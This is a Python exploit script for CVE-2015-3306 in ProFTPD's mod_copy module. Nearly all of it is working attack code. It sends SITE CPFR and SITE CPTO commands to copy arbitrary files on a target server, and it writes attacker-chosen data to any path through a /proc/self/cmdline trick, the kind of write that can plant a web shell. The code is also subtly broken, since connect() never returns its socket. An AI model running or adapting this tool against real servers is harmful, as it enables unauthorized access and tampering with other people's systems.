#!/usr/bin/env python

# CVE-2015-3306 exploit by t0kx
# Updated exploit script by macr0nerd
# https://github.com/t0kx/exploit-CVE-2015-3306
# https://github.com/Macr0Nerd/red_scripts/proftpd_mod_copy_exploiter.py

import argparse
import contextlib
import logging
import platform
import re
import socket
import sys

import requests


logger = logging.getLogger(__name__)


def connect(host, port, **_) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    logger.debug(sock.recv(1024).decode('utf-8'))

def copy(sock: socket.socket, source, destination, **_) -> int:
    sock.send((f'SITE CPFR {source}\r\n').encode('utf-8'))
    logger.debug(sock.recv(1024).decode('utf-8'))
    sock.send((f'SITE CPTO {destination}\r\n').encode('utf-8'))
    
    result = sock.recv(1024).decode('utf-8')
    logger.debug(result)

    if 'Copy successful' in result:
        logger.info('Target exploited, copied %s to %s', source, destination)
        return 0
    else:
        logger.error('Failed')
        return 1

def echo(sock: socket.socket, destination, *, file=None, data=None, tmp=None, **_) -> int:
    if file:
        try:
            with open(file, 'r') if file != '-' else contextlib.nullcontext(sys.stdin) as f:
                data = f.read()
        except FileNotFoundError as exc:
            logger.error('Could not open input file, exiting...')
            return exc.errno

    sock.send(('SITE CPFR /proc/self/cmdline\r\n').encode('utf-8'))
    logger.debug(sock.recv(1024).decode('utf-8'))
    sock.send((f'SITE CPTO {tmp}/.{data}\r\n').encode('utf-8'))
    logger.debug(sock.recv(1024).decode('utf-8'))
    sock.send((f'SITE CPFR {tmp}/.{data}\r\n').encode('utf-8'))
    logger.debug(sock.recv(1024).decode('utf-8'))
    sock.send((f'SITE CPTO {destination}\r\n').encode('utf-8'))
    
    result = sock.recv(1024).decode('utf-8')
    logger.debug(result)

    if 'Copy successful' in result:
        logger.info('Target exploited, wrote to %s', destination)
        return 0
    else:
        logger.error('Failed')
        return 1


def arguments() -> dict:
    def add_basic_args(parser):
        parser.add_argument('-H', '--host', help='target host')
        parser.add_argument('-p', '--port', help='target port', default=21)
    
    parser = argparse.ArgumentParser()
    add_basic_args(parser)
    subparsers = parser.add_subparsers(required=True, dest='action')

    
    copy_parser = subparsers.add_parser('copy', description='copy files')
    
    add_basic_args(copy_parser)
    copy_parser.add_argument('-s', '--source', help='source file', required=True)
    copy_parser.add_argument('-d', '--destination', help='destination file', required=True)

    
    echo_parser = subparsers.add_parser('echo', description='write files')
    
    add_basic_args(echo_parser)
    echo_parser.add_argument('-d', '--destination', help='destination file', required=True)
    echo_parser.add_argument('--tmp', help='absolute writable path', default='/tmp')
    
    echo_input_me_parser = echo_parser.add_mutually_exclusive_group(required=True)
    echo_input_me_parser.add_argument('-f', '--file', help='input file')
    echo_input_me_parser.add_argument('-D', '--data', help='input data')
    
    
    parser_logging = parser.add_argument_group(title='logging arguments')
    parser_logging.add_argument('-v', '--verbose', help='verbose output', action='store_true')
    parser_logging.add_argument('-q', '--quiet', help='suppress output', action='store_true')
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = vars(parser.parse_args())

    if not args.get('host'):
        logger.error('Target host must be specified, exiting...')
        sys.exit(1)
    if not args.get('port'):
        logger.error('Target port must be specified, exiting...')
        sys.exit(1)
    
    if args.get('verbose'):
        logger.setLevel(logging.DEBUG)
    elif args.get('quiet'):
        logger.setLevel(logging.ERROR)
    else:
        logger.setLevel(logging.INFO)
    
    return args

def main() -> int:
    logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s')
    args = arguments()
    
    logger.info('CVE-2015-3306 exploit by t0kx')
    logger.info('Updated exploit script by macr0nerd')
    logger.info('Exploiting %s:%s', args['host'], args['port'])

    actions = {
        'copy': copy,
        'echo': echo,
    }

    ftp_socket = connect(**args)
    exit_code = actions[args['action']](ftp_socket, **args)
    
    return exit_code

if __name__ == '__main__':
    sys.exit(main())
